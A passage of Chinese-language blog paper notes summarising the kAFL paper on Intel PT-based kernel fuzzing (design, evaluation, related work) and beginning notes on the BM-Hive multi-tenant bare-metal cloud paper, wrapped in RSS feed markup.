Hypercall</h2><p>hypercall 由 <code>vmcall</code> 指令调起以主动触发 VM-Exit，作者修改了 KVM-PT 以接收 ring3 的 hypercall，并通过 <code>rcx</code> 寄存器传参，例如 <code>HC_SUBMIT_BUFFER</code> 通过 <code>rcx</code> 存储一个 guest 指针，另一个例子是告知 <code>fuzzing logic</code> 目标 OS 发生了 crash，注入的代码如 List 1 所示</p><p><img src="https://s2.loli.net/2024/07/30/WHY1MB5kzoqf6cp.png" alt="Listing 1: Hypercall crash notifier."></p><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><p>代码开源于 <a href="https://github.com/RUB-SysSec/kAFL">https://github.com/RUB-SysSec/kAFL</a></p><h2 id="4-1-KVM-PT"><a href="#4-1-KVM-PT" class="headerlink" title="4.1 KVM-PT"></a>4.1 KVM-PT</h2><p>Intel PT 允许我们在不修改&#x2F;重编译目标内核的情况下追踪分支转移，据作者所知过去不曾有公开可用的驱动能够使用 Intel PT 仅追踪单个 vCPU 的 guest 执行，如 <a href="https://github.com/andikleen/simple-pt">Simple-PT</a> 在设计上不支持长期追踪，<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/plain/tools/perf/Documentation/intel-pt.txt?id=refs/tags/v4.8">perf-subsystem</a> 可以长期追踪但仅能追踪逻辑 CPU 而非 vCPU</p><p>为了解决这些缺点，作者开发了 KVM-PT，其允许我们在无限长的时间内追踪 vCPU ，并导出一个用户模式接口供 QEMU-PT 访问追踪数据</p><h3 id="4-1-1-vCPU-Specific-Traces"><a href="#4-1-1-vCPU-Specific-Traces" class="headerlink" title="4.1.1 vCPU Specific Traces"></a>4.1.1 vCPU Specific Traces</h3><p>开启 Intel PT 需要在 ring0 启用 MSR 寄存器的 <code>IA32_RTIT_CTL_MSR.TraceEn</code> 位，这需要在进入 VM 前完成，在 VM-Exit 后则需要反向操作，而手动修改 MSR 会产生不必要的追踪数据，作者使用 Intel VT-x 的 MSR 自动加载功能（如修改 <code>VMCS.VM_ENTRY_CONTROL_MSR</code> ）来在 VM-Entry &amp; VM-Exit 时加载预配置 MSR</p><blockquote><p>笔者注：这点事都能写这么一大段❓</p></blockquote><h3 id="4-1-2-Continuous-Tracing"><a href="#4-1-2-Continuous-Tracing" class="headerlink" title="4.1.2 Continuous Tracing"></a>4.1.2 Continuous Tracing</h3><p>如图 3 所示的物理地址表（Table of Physical Addresses,ToPA）项结构体数组用以指示 Intel PT 如何填充缓冲区，在主缓冲区填满后 CPU 可以停止追踪或是产生能造成 VM-Exit 的中断（当前的实现为非即时）以让 VMM 重置缓冲区后恢复 VM 执行，overflow buffer 被放置在 main buffer 后以避免实际传递中断前可能的追踪数据丢失（其若也溢出则导致追踪停止，此时会新增一个数据表指示数据丢失）</p><p><img src="https://s2.loli.net/2024/07/30/A4IKLpswex36Vi5.png" alt="Figure 3: KVM-PT ToPA configuration."></p><h2 id="4-2-QEMU-PT"><a href="#4-2-QEMU-PT" class="headerlink" title="4.2 QEMU-PT"></a>4.2 QEMU-PT</h2><p>QEMU-PT 通过 KVM-PT 的用户空间接口（<code>ioctl()</code> 与 <code>mmap()</code> ）配置 Intel PT 并定期检查 ToPA，并将 Intel PT 数据包解码为类似 AFL 的位图</p><p><img src="https://s2.loli.net/2024/07/30/EaOTDcZjyh6oWrX.png" alt="Figure 4: Overview of the pipeline that converts Intel PT traces to kAFL bitmaps."></p><h3 id="4-2-1-PT-Decoder"><a href="#4-2-1-PT-Decoder" class="headerlink" title="4.2.1 PT Decoder"></a>4.2.1 PT Decoder</h3><p>解码器需要足够高效以应对产生速率为几百 MB 每秒的内核模糊测试追踪数据，且需要足够的精确</p><p>Intel 为客制 Intel PT 解码器提供了自己的通用解码引擎 <a href="https://github.com/intel/libipt">libipt</a> ，但 kAFL 仅依赖流信息，而 libipt 在提供执行数据与流信息的同时并不缓存反汇编指令，因此作者实现了一个类似即时（just-in-time）解码器的软件，并缓存所有反汇编指令以优化查找，同时忽视与测试用例无关的数据包</p><p>作者的解码器在 ToPA 区域被填充后便开始解码（而非等待填满），并翻译为 AFL 位图格式</p><h2 id="4-3-AFL-Fuzzing-Logic"><a href="#4-3-AFL-Fuzzing-Logic" class="headerlink" title="4.3 AFL Fuzzing Logic"></a>4.3 AFL Fuzzing Logic</h2><p>作者的 fuzzing logic 与 AFL 十分相似，每个基本块被给予一个随机 ID，从块 A 到 B 的转移被通过如下方程赋予一个偏移值到位图中：</p><p><img src="https://s2.loli.net/2024/07/30/IiFG56ULtmM2qlZ.png"></p><p>不同于编译期随机，kAFL 使用基本块的地址作为 ID，在观测到转移后便增加位图中计数，在 fuzzing 迭代结束后将位图的每个 entry 舍入以仅保留最高位，并与全局静态位图对比以检查是否发现新位，若是则添加到全局静态位图并将触发新位的输入添加到队列中，当发现了有趣的输入时则进行逐字节变异，该阶段完成后在随机位置进行变异（若前阶段发现新的输入则将推迟），触发新转移的输入将会给予更高的优先级</p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>作者的实验机器为 <code>Intel i7-6700 processor, 32 GB DDR4 RAM</code> ，为避免 IO 性能影响，所有基准测试在一个 RAM disk 上完成</p><p>类似 AFL ，若一个造成 crash  的输入触发了此前未有的基本块转移，则作者认为其是唯一的（但不意味着底层错误唯一）</p><h2 id="5-1-Fuzzing-Windows"><a href="#5-1-Fuzzing-Windows" class="headerlink" title="5.1 Fuzzing Windows"></a>5.1 Fuzzing Windows</h2><p>作者实现了一个小的特定于 Windows 10 的 user mode agent，通过虚拟磁盘对 NTFS 的 4 天 + 19 小时 fuzzing 后找到了 59 个独立的 crashes（都是除以 0 错误），经检查作者怀疑可能只有一个独立的错误</p><p>此外作者还实现了一个通用 syscall fuzzing agent，但在 Windows 下 13 个小时的 6.3 百万次执行中未发现 crash，由于 kAFL 得益于覆盖率反馈很快习得如何生成有效载荷以执行有效系统调用，导致了 fuzzing agent 中的意外的用户回调，从而使得 agent 需要高昂开销以重启，导致美妙仅能执行约 134 次</p><h2 id="5-2-Fuzzing-Linux"><a href="#5-2-Fuzzing-Linux" class="headerlink" title="5.2 Fuzzing Linux"></a>5.2 Fuzzing Linux</h2><p>作者为 Linux 实现了一个类似的 agent 以测试 ext4 ，但效率比 Windows 快得多（每秒 1k～2k次执行），从而在 12 天的测试中发现了 160 个独立的 crash 并确认了多个 bug，图 5 展示了另一个模糊测试的前 32 小时</p><p><img src="https://s2.loli.net/2024/07/30/qjA8raLVybPzdWI.png" alt="Figure 5: Fuzzing the ext4 kernel module for 32 hours."></p><h2 id="5-3-Fuzzing-macOS"><a href="#5-3-Fuzzing-macOS" class="headerlink" title="5.3 Fuzzing macOS"></a>5.3 Fuzzing macOS</h2><p>作者在 HFS 驱动中找到了 150 个 crash 并手动确认了至少三个为导致内核崩溃的独立漏洞，这可以造成 DoS 攻击，此外 kAFL 在 APFS 内核扩展中发现了 220 个独立的 crash，目前都被上报给了 Apple</p><h2 id="5-4-Rediscovery-of-Known-Bugs"><a href="#5-4-Rediscovery-of-Known-Bugs" class="headerlink" title="5.4 Rediscovery of Known Bugs"></a>5.4 Rediscovery of Known Bugs</h2><p>作者在 <code>keyctl()</code> 接口上评估了 kAFL，成功找到此前已知的 CVE-2016-07583，并找到了一个未知错误（已被分配为 CVE-2016-86504），其在短短一小时内成功触发 17 个独立的 KASan 报告与 15 个独立的 panic，生成了超过 3400 万个输入，发现了 295 个有趣的输入，每秒执行约 9k 次，该实验为 8 进程并行</p><h2 id="5-5-Detected-Vulnerabilities"><a href="#5-5-Detected-Vulnerabilities" class="headerlink" title="5.5 Detected Vulnerabilities"></a>5.5 Detected Vulnerabilities</h2><p>kAFL 在测试过程中发现超过 1k 个独立的 crash，作者手动分析了一部分并与对应的维护者确认了如下漏洞：</p><p><img src="https://s2.loli.net/2024/07/30/fiTSLREMCYJ3yUF.png"></p><h2 id="5-6-Fuzzing-Performance"><a href="#5-6-Fuzzing-Performance" class="headerlink" title="5.6 Fuzzing Performance"></a>5.6 Fuzzing Performance</h2><p>作者创建了一个基于 jsmn 的 JSON parser driver（如 List 2 所示，在 JSON 字符串以 <code>&quot;KAFL&quot;</code> 起始时触发 crash）并在三个系统上进行了测试，并与 TriforceAFL 和 syzkaller 进行对比</p><p><img src="https://s2.loli.net/2024/07/30/SjNFMhyBD1oHze6.png" alt="Listing 2: The JSON parser kernel module used for the coverage benchmarks."></p><p>30 分钟的测试结果如表 1 所示，然而 TriforceAFL 未能触发崩溃路径，因而很难与 kAFL 比较覆盖率</p><p><img src="https://s2.loli.net/2024/07/30/xW3cr8Zqo2fleR9.png" alt="Table 1: kAFL and TriforceAFL fuzzing performance on the JSON sample driver."></p><p>覆盖率结果如图 6 所示，不过随着 fuzzing 时间增长，新路径更难被发现，因此这不是个好的指标</p><p><img src="https://s2.loli.net/2024/07/30/rYB9mdXJPUAhbRt.png" alt="Figure 6: Coverage comparison of kAFL (initramfs) and TriforceAFL. kAFL takes less than 3 minutes to find the same number of paths as TriforceAFL does in 30 minutes (each running 1 process)."></p><p>图 7 显示了 kAFL 与 TriforceAFL 在 raw execution 上的性能对比</p><p><img src="https://s2.loli.net/2024/07/30/4ArNBvGP57hx8Hn.png" alt="Figure 7: Raw execution performance comparison."></p><p>与 syzkaller 间作者并未做性能对比，因为其是一个高度特定的 syzkaller fuzzer，且其知识使其可以在无反馈下产生更高的代码覆盖率，因此除非作者实现了相同的系统调用逻辑，否则覆盖率对比会存在误导性</p><h2 id="5-7-KVM-PT-Overhead"><a href="#5-7-KVM-PT-Overhead" class="headerlink" title="5.7 KVM-PT Overhead"></a>5.7 KVM-PT Overhead</h2><p>作者在一个 <code>i5-6500@3.2Ghz</code> 桌面环境中对了不同的 KVM-PT 配置，将追踪限定在内核地址空间，图 8 说明了没有 KVM-PT 下的执行相对开销</p><blockquote><p>多的不抄了，自己看原文：）</p></blockquote><p><img src="https://s2.loli.net/2024/07/30/e1QHoCktLNDbGvu.png" alt="Figure 8: Overhead for compiling QEMU-2.6.0 in a traced VM."></p><h2 id="5-8-Decoder-Engine"><a href="#5-8-Decoder-Engine" class="headerlink" title="5.8 Decoder Engine"></a>5.8 Decoder Engine</h2><p>解码过程没有硬件加速，因此解码器对 fuzzing 整体性能有显著影响，作者将自己的解码器与 Intel ptxed 进行了对比，在一个 <code>i5-6500@3.2Ghz</code> 环境中进行了测试，结果如图 9 所示</p><p><img src="https://s2.loli.net/2024/07/30/bZ7wTskyI1F2dm9.png" alt="Figure 9: kAFL and ptxed decoding time on multiple copies of the same trace (kAFL is up to 30 times faster)."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><h2 id="6-1-Black-Box-Fuzzers"><a href="#6-1-Black-Box-Fuzzers" class="headerlink" title="6.1 Black-Box Fuzzers"></a>6.1 Black-Box Fuzzers</h2><p>此类 fuzzer 与目标程序没有任何交互，为了提高效率通常会进行一些假设，例如 <a href="https://github.com/aoh/radamsa">Radamsa</a> 或 <a href="https://github.com/samhocevar/zzuf">zzuf</a> 会假设大量覆盖率良好的输入会反复发生变异与重组，而 <a href="http://www.peachfuzzer.com/">Peach</a> 与 <a href="https://github.com/OpenRCE/sulley">Sulley</a> 需要程序员指定如何生成看起来几乎像真正文件的半可用输入文件；上述这些都有一个重要缺陷：耗时过高</p><p>为了提高黑盒 fuzzer 的性能，研究人员提出了不少技术，如 <a href="https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/holler">Holler 提出了从旧的 crash 输入中习得输入语法的有趣部分</a> ，还有人提出根据程序追踪来推断输入语法等，<a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf">Rebert 则优化了对有趣输入的选择</a></p><h2 id="6-2-White-Box-fuzzers"><a href="#6-2-White-Box-fuzzers" class="headerlink" title="6.2 White-Box fuzzers"></a>6.2 White-Box fuzzers</h2><p>程序分析方法被引入以减少测试负担，类似 <a href="https://dl.acm.org/doi/pdf/10.1145/2090147.2094081">SAGE</a> 、<a href="https://dl.acm.org/doi/10.1145/1064978.1065036">DART</a> 、 <a href="https://www.usenix.org/legacy/event/osdi08/tech/full_papers/cadar/cadar.pdf">KLEE</a> 、 <a href="https://www.usenix.org/legacy/events/sec09/tech/full_papers/molnar.pdf">SmartFuzz</a> 、<a href="https://ieeexplore.ieee.org/document/6234425">Mayhem</a> 这样的工具尝试使用符号执行与约束求解技术枚举复杂路径，<a href="https://ieeexplore.ieee.org/document/5504701">TaintScope</a> 、<a href="https://ieeexplore.ieee.org/document/5070546">BuzzFuzz</a> 、<a href="https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/vuzzer-application-aware-evolutionary-fuzzing/">Vuzzer</a> 利用污点追踪与类似的动态分析技术来发现新路径，他们通常都能找到隐藏在 checksum、magic constraint 等难以被随机输入满足的复杂代码路径，另一种办法是使用相同类型的信息来搜索危险行为而非新代码路径</p><p>缺点是这些技术通常难以实现并扩展到大型程序上，据作者所知目前暂时没有针对操作系统的这样的工具</p><h2 id="6-3-Gray-Box-Fuzzers"><a href="#6-3-Gray-Box-Fuzzers" class="headerlink" title="6.3 Gray-Box Fuzzers"></a>6.3 Gray-Box Fuzzers</h2><p>灰盒 fuzzer 在保留黑盒的高吞吐量与简易性获得白盒所使用的高级机制提供的额外覆盖，比较好的灰盒测试的例子是 AFL，其使用覆盖率信息指引以避免在不触发新状态的输入上耗费时间，其他的一些 fuzzer 也使用了类似机制</p><p>为了进一步提高灰盒测试的有效性，许多用在黑盒测试中的技术也被使用，例如 <a href="https://dl.acm.org/doi/10.1145/2976749.2978428">Böhme 展示了如何使用马尔可夫链来提高灰盒测试性能</a></p><h2 id="6-4-Coverage-Guided-Kernel-Fuzzers"><a href="#6-4-Coverage-Guided-Kernel-Fuzzers" class="headerlink" title="6.4 Coverage-Guided Kernel Fuzzers"></a>6.4 Coverage-Guided Kernel Fuzzers</h2><p>Vyukov 放出的项目 <a href="https://github.com/google/syzkaller">syzkaller</a> 是第一个公开的能够用于覆盖率引导的内核 fuzzer ；Nossum 与 Casanovas 通过一个<a href="https://events.static.linuxfound.org/sites/events/files/slides/AFL%20filesystem%20fuzzing%2C%20Vault%202016_0.pdf">修改版 AFL</a> 证明了绝大部分 Linux 文件系统驱动对于反馈驱动的模糊测试都是脆弱的</p><p>Hertz 和 Newsham 在 2016 年发布了名为 <a href="https://github.com/nccgroup/TriforceAFL">TriforceAFL</a> 的 AFL 修改版，其基于一个修改版的 QEMU ，利用了对应的模拟后端通过在执行控制流更改指令后确定当前的指令指针来测量模糊测试进度，这理论上可以测试任何 QEMU 能模拟的操作系统，但事实上 TriforceAFL 仅限于能够从只读文件系统启动的操作系统（基本上只有 UNIX-like），无法测试 macOS 或 Windows 等闭源操作系统</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>作者的工作仍有一些缺陷</p><p><strong>OS-Specific Code.</strong>  作者使用了少量特定于操作系统的代码来执行三个任务：将模糊测试输入转为与操作系统的交互、获取操作系统对崩溃处理程序的地址、返回某些驱动程序的地址</p><p>这些功能都不是必须的，第一个问题可以用通用系统调用来避免，同时也不一定需要崩溃处理程序的地址来检测 VM crash</p><p><strong>Supported CPUs.</strong> 本文的工作局限于支持 Intel VT-x 技术的 CPU，但对于哪些 CPU 确乎支持指令指针过滤、multi-entry ToPA 等含糊其辞，</p><p><strong>Just-In-Time Code.</strong> intel PT 并不提供已执行指令指针的完整列表，这需要解码器完成控制流重建，但若程序在运行时被修改（例如 JIT）则无法准确恢复运行时控制流，因此解码器需要对程序应用的修改信息，如 <a href="https://dl.acm.org/doi/10.1145/2523649.2523675">Deng 等人使用 EPT violation 实现</a>，更老的做法是<a href="https://dl.acm.org/doi/10.1145/1455770.1455779">使用影子页表</a></p><p><strong>Multibyte Compares.</strong> 本文的工作无法知道程序中较大的 magic values，但使用比如混合执行（如 <a href="https://sites.cs.ucsb.edu/~vigna/publications/2016_NDSS_Driller.pdf">Driller</a> ）或是污点追踪（如 <a href="https://www.ndss-symposium.org/ndss2017/ndss-2017-programme/vuzzer-application-aware-evolutionary-fuzzing/">Vuzzer</a> ）技术可以提高性能，但都无法轻易被应用到闭源操作系统内核中</p><p><strong>Ring 3 Fuzzing.</strong> 作者仅针对内核代码使用了该技术，但这个方法也适用于用于用户态，作者预计其将由于基于动态二进制插桩的方法（如 <a href="https://github.com/googleprojectzero/winafl">winAFL</a> ）</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><p>作者提出了使用 CPU 新特性的反馈驱动的内核模糊测试方法，性能明显优于其他方法，很好很强大🎆🎇🎇🎆</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Rabbit’s adventures in kernel land&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="系统虚拟化" scheme="https://arttnba3.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Intel PT" scheme="https://arttnba3.github.io/tags/Intel-PT/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x06】论文笔记：High-density Multi-tenant Bare-metal Cloud</title>
    <link href="https://arttnba3.github.io/2024/07/27/PAPER-0X06-ASPLOS2020_BMHIVE/"/>
    <id>https://arttnba3.github.io/2024/07/27/PAPER-0X06-ASPLOS2020_BMHIVE/</id>
    <published>2024-07-26T20:25:38.000Z</published>
    <updated>2024-07-26T20:32:12.364Z</updated>
    
    <content type="html"><![CDATA[<p>出走字节 IaaS 开发实习两年，归来读安全 PhD 依然在做 DPU</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近不知道为什么又开始看 DPU 了（反正就是啥都想弄一点），所以先从这篇非常经典的论文入手：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>虚拟化技术是 IaaS 的基石，虽然多租户共享同一物理机提高了数据中心服务器的利用率，但带来对安全问题的忧虑（尤其是侧信道攻击），且增加了资源开销；新兴的裸金属云提供了强隔离性与对硬件的完全访问，但只能将整台物理服务器租给用户，无法在出租后对用户程序控制，且扩展性差、成本效率低</p><p>本文提出一种新的高密度、多租户裸金属云设计：<code>BM-Hive</code> ，每个裸金属客户运行在各自的计算板上——带有专有 CPU 与内存的 PCIe 扩展板，其软硬件混合 virtio I&#x2F;O 系统允许客户直接访问云网络与存储设备；<code>BM-Hive</code> 可以显著提升裸金属服务的成本效益，从硬件层分隔裸金属用户以提供更好的安全与隔离；<code>BM-Hive</code> 被作者部署在最大的公有云基础设施之一上，为数万用户同时服务</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>虚拟化技术是公有 IaaS 云的基石，EPT 这样的高级虚拟化技术显著提升了 VM 性能，但多租户共享同一物理机带来对安全与性能的忧虑，尤其是针对 CPU 缓存与超线程等紧密结合的资源的侧信道攻击，此外共享资源冲突可以带来不可预估的性能波动</p><p><strong>Limitations of existing approach</strong> ：为了解决这些问题，租户独占物理机的裸金属服务出现了（称为单租户裸金属服务器，因为只能整个租出），但其仍有一些成本效益、性能、互通性上的限制：</p><ul><li><strong>Cost</strong> ：单租户裸金属服务器只能整个租出，但用户不一定需要这么多性能</li><li><strong>Single-thread performance</strong> ：绝大多数云服务器使用核数多但单核弱的 Xeon ，裸金属服务的用户通常需要更高性能</li><li><strong>Interoperability and manageability</strong> ：裸金属服务必须无缝结合到现有云系统中以从弹性云架构中受益，然而单租户裸金属服务与现有的基于 VM 的云不同，其通常由 Intel Management Engine 类已知不安全系统管理，且裸金属服务应当与 VM 镜像兼容以复用镜像</li></ul><p><strong>Our approach</strong> ：本文给出 <code>BM-Hive</code> 的设计：一个可以解决所有这些挑战的可扩展的多租户裸金属服务，其由三部分组成：一个裸金属 hypervisor （ <code>bm-hypervisor</code> ，对应传统的 <code>vm-hypervisor</code> ）、一组裸金属客户（ <code>bm-guest</code> ，对应传统的 <code>vm-guest</code>）、一个 IO 枢纽（<code>IO-Bond</code>）； <code>bm-hypervisor</code> 运行在服务器主 CPU 上管理所有 guests 的生命周期并作为 <code>IO-Bond</code> 后端，但不似 <code>vm-hypervisor</code> 那样要虚拟化 CPU 或内存，而是每个 <code>bm-guest</code> 都运行在各自的计算板上（由专有处理器、内存单元、PCIe 接口组成）； <code>IO-Bond</code> 作为硬件的一部分由 FPGA 进行实现以用于在主板与计算板间通信，其一方面模拟 I&#x2F;O 设备（例如 virtio 网络与块设备），另一方面将计算板与主板的 PCIe 总线连接并转发  <code>bm-guest</code> 的 I&#x2F;O 请求到  <code>bm-hypervisor</code> </p><p> <code>BM-Hive</code> 的设计充分解决了单租户裸金属服务的限制， <strong>首先</strong> ， <code>BM-Hive</code> 可以在一个  <code>BM-Hive</code> 服务器上支持 16 个 <code>bm-guest</code> ，提升服务密度的同时降低开销， <strong>其次</strong> ，<code>bm-guest</code> 可以使用任何计算板所支持的 CPU, <strong>最后</strong> ， <code>BM-Hive</code> 可以无缝融合到现有云基础架构中；最主要的区别是 <code>vm-guest</code> 运行在虚拟 CPU 上，而 <code>bm-guest</code> 运行在计算板上，而这对云基础架构而言是无感知的（归功于 <code>bm-hypervisor</code> 与 <code>IO-Bond</code> ），表 1 对比了三种类型云服务的不同层；此外 <code>bm-guest</code> 无法完全控制整个服务器， <code>bm-hypervisor</code> 通过 PCIe 接口控制其执行，且 <code>IO-Bond</code> 在硬件中强制对 <code>bm-guest</code> 进行适当隔离</p><p><img src="https://s2.loli.net/2024/07/25/xhGA7yFgsMUo1c4.png" alt="Table 1. Comparison of three cloud services"></p><p>作者在最大的 IaaS 公有云数据中心之一部署了 <code>BM-Hive</code> ，并彻底分析了其安全性与性能表现，其实验展示了 <code>BM-Hive</code> 的强隔离、安全与性能</p><p>总而言之，本文贡献如下：</p><ul><li>作者提出来新的裸金属云设计，结合了现有基于 VM 的与单租户裸金属的服务器的优点，并提供安全、灵活、可操作的裸金属云服务</li><li><code>BM-Hive</code> 有软硬件结合的 virtio 系统，让 guests 可以直接与现有云基础架构结合，直接获得云服务的可用性与弹性</li><li>作者基于 <code>BM-Hive</code> 的设计构建了一个产品级的系统并在真实的云中部署，证明了 <code>BM-Hive</code> 的可行性</li><li>作者在最大的公有云基础设施之一部署了 <code>BM-Hive</code> 并充分测量其性能，证明了其相对基于 VM 的云服务的优点</li></ul><h1 id="0x02-Background-and-Motivation"><a href="#0x02-Background-and-Motivation" class="headerlink" title="0x02. Background and Motivation"></a>0x02. Background and Motivation</h1><p><strong>Background</strong> ：虚拟化是传统云的关键技术，主要有 CPU、内存、I&#x2F;O 三个层面，CPU 与 内存虚拟化由处理器提供，云上 I&#x2F;O 则通常是半虚拟化，Guest侧内核直接请求与处理高级 I&#x2F;O 操作，而非模拟低级 I&#x2F;O 操作（如寄存器访问），或是直接硬件设备直通</p><h2 id="2-1-Impact-on-Performance"><a href="#2-1-Impact-on-Performance" class="headerlink" title="2.1 Impact on Performance"></a>2.1 Impact on Performance</h2><p><strong>Performance overhead</strong> ：许多事件都能产生 VM exits 而造成大量开销（单个 exit 事件至少 10 µs 的情况下，每秒 5000+ 次 VM exit 将是不可忽视的开销），表 2 展示了在作者的云数据中心上 5 min 内的 300000 个 VM 的统计情况</p><p><img src="https://s2.loli.net/2024/07/25/yPx3XfA87FgMTdZ.png" alt="Table 2. Number of VM exits per second per vCPU"></p><p>即便是 Guest 直接访问硬件的设备直通也会有开销，基于 IOMMU 的实现可以增加 60% 的网卡在 CPU 上使用（但吞吐量不变）</p><p>此外还有其他会增加性能开销的层面（如 vCPU 锁、TLB等），但这些在 <code>BM-Hive</code> 服务器中都没有</p><p><strong>Performance variation</strong> ：共享资源的冲突同样带来性能影响，如 I&#x2F;O 处理高峰期 host OS 可能抢占 guest VM 执行而造成性能开销与波动</p><p>图 1 展示了作者的数据中心在 24 小时内的 20000 VM 由低到高的被 hypervisor 抢占率（shared 表示未与物理核心绑定），需要注意的是这种情况下没有 VM 主动尝试占有资源（否则会更糟）</p><p><img src="https://s2.loli.net/2024/07/25/Oe3Li9aIoykAs7Z.png" alt="Figure 1. VM preemption of the 99th and 99.9th percentile. The y-axis shows the percent of the CPU time used by the hypervisor/the host OS."></p><h2 id="2-2-Security-Concerns"><a href="#2-2-Security-Concerns" class="headerlink" title="2.2 Security Concerns"></a>2.2 Security Concerns</h2><p>VM 间硬件资源共享可能导致侧信道攻击（如 Meltdown、Spectre、L1TF 等），但在 <code>bm-guest</code> 物理隔离的 <code>BM-Hive</code> 上不存在这个问题</p><p>hypervisor 漏洞是云上主要攻击面，但 <code>bm-hypervisor</code> 无需 CPU&#x2F;内存 虚拟化且不能从 guests 侧直接访问</p><blockquote><p>笔者注：这一块实际上笔者感觉不是很彳亍，因为模拟设备在 DPU 上模拟（通常由 QEMU 实现）同样会有漏洞，对于攻击者而言似乎只是攻击的位置变了</p></blockquote><h2 id="2-3-Nested-Hypervisor"><a href="#2-3-Nested-Hypervisor" class="headerlink" title="2.3 Nested Hypervisor"></a>2.3 Nested Hypervisor</h2><p>传统云用户想要再跑虚拟机只能依赖嵌套虚拟化，这增大了 hypervisor 设计复杂度与性能开销</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="3-1-Design-Requirements"><a href="#3-1-Design-Requirements" class="headerlink" title="3.1 Design Requirements"></a>3.1 Design Requirements</h2><p><code>BM-Hive</code> 设计要求如下：</p><ul><li><p><strong>Multi-tenancy</strong> ： <code>BM-Hive</code> 必须支持多租户共享同一物理服务器以实现细粒度 CPU 核心</p></li><li><p><strong>Security</strong> ： <code>BM-Hive</code> 必须提供基于硬件的 <code>bm-guests</code> 间强隔离</p></li><li><p><strong>Interoperability</strong> ：  <code>BM-Hive</code> 必须与现有云基础架构兼容以获取已有的可用性、依赖性、弹性，互通性（interoperability）要求 <code>bm-guest</code> 同样能运行在 VM 中，这个特性称为 <code>cold migration</code> ，其一个依赖项便是 <code>bm-guest</code> 必须能够与云存储与网络进行高性能连接（由 virtio 这样的半虚拟化支持）， <code>BM-Hive</code> 通过特制的软硬件混合 virtio 实现</p></li><li><p><strong>Performance</strong> ： <code>bm-guest</code> 应当有原生 CPU&#x2F;内存性能与近原生 IO 性能以及最小的性能波动</p></li><li><p><strong>Cost efficiency</strong> ：<code>bm-guest </code>在同配置下 开销应比 <code>vm-guest</code> 小</p></li></ul><h2 id="3-2-System-Overview"><a href="#3-2-System-Overview" class="headerlink" title="3.2 System Overview"></a>3.2 System Overview</h2><p>图 2 对比了虚拟化架构与 <code>BM-Hive</code> 的区别，主要区别是 <code>vm-guest</code> 运行在虚拟化 CPU 与内存上而 <code>bm-guest</code> 运行在物理 CPU 与内存上，<code>bm-hypervisor</code> 是类似 <code>vm-hypervisor</code> 的用户态程序，管理 <code>vm-guest</code> 生命周期、提供 virtio 设备、与云基础架构交互等，其不需要虚拟化因而代码比 <code>vm-hypervisor</code> 简单得多，<code>bm-hypervisor</code> 进程与 <code>bm-guest</code> 间一一对应且只能通过 virtio 交互</p><p><img src="https://s2.loli.net/2024/07/25/ACfzumlg1c6UDhI.png" alt="Figure 2. Architecture of BM-Hive, compared to KVM"></p><p><strong>Use scenario</strong> ：云基础架构选择一个可用的裸金属服务器并选择一个空闲计算卡启动（通过开启 PCIe power），板上固件开始执行 boot loader 并随后加载 <code>bm-guest</code> 内核，云上绝大部分 guests 无法使用本地存储，因此 bootloader 与内核通过 virtio-blk 获取，作者通过扩展 EFI 固件以实现这一点</p><h2 id="3-3-System-Architecture"><a href="#3-3-System-Architecture" class="headerlink" title="3.3 System Architecture"></a>3.3 System Architecture</h2><p>图 3 展示了 <code>BM-Hive</code> 的系统架构，每个裸金属服务器由简化的 Xeon 服务器（<code>base</code> ）与一组计算卡（由 CPU、内存、PCIe 总线、FPGA 构建的 IO-Bond 组成的 PCIe 卡）组成，在 <code>bm-guest</code> 视角由计算卡模拟的 virtio 设备是常规的 PCIe 设备，IO-Bond 作为 <code>bm-guest</code> 中的 virtio 前端与 <code>bm-hypervisor</code> 中的 virtio 后端间的桥梁，并通过内置的 DMA 引擎进行命令与数据的转发；IO-Bond 目前支持 virtio 网络与存储设备，且可以轻易扩展，此外其可以由 ASIC 芯片实现</p><p><img src="https://s2.loli.net/2024/07/25/bEaomMIZGgAkjX8.png" alt="Figure 3. System architecture of BM-Hive"></p><p>在 <code>bm-hypervisor</code> 的角度每个计算卡便是一个 PCIe 的 <code>bm-guest</code> 设备，一个 <code>base</code> 服务器可以支撑 16 张计算卡，<code>bm-hypervisor</code> 的功能主要有：1️⃣ 管理 <code>bm-guest</code> 生命周期与计算卡分配 2️⃣ 提供并维护 virtio 设备后端 3️⃣ 与现有云基础架构对接</p><h2 id="3-4-IO-Bond"><a href="#3-4-IO-Bond" 